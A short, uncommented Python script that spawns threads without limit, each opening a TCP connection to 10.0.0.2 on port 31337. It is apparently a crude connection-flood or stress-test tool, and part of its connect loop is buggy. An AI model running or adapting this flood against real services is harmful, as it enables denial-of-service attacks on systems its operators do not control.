import threading
import socket


def connect_only():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        while True:
            s.connect(("10.0.0.2", 31337))
            print("connected")
    except Exception as e:
        print("failed:", e)
    finally:
        s.close()


def main():
    threads = []
    while True:
        t = threading.Thread(target=connect_only)
        t.start()
        threads.append(t)


if __name__ == "__main__":
    main()
